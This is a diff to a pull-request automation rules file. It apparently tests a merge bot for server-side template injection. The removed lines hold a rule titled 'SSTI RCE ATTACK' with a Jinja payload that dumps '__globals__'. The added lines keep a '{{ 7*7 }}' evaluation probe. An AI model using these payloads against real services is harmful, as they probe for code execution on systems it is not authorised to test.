@@ -1,11 +1,22 @@
 pull_request_rules:
-  - name: SSTI RCE ATTACK
+  - name: label-test
+    conditions:
+      - base=master
+    actions:
+      label:
+        add:
+          - ssti-poc-label
+  - name: assign-test
+    conditions:
+      - base=master
+    actions:
+      assign:
+        add_users:
+          - philbalog13
+  - name: comment-template
     conditions:
       - base=master
     actions:
       comment:
-        message: |
-          **SSTI {{ 7*7 }}**
-          ```
-          {{ [lipsum]|map(attribute="__globals__")|pprint }}
-          ```
+        message: >
+          SSTI OUTPUT: {{ 7*7 }}
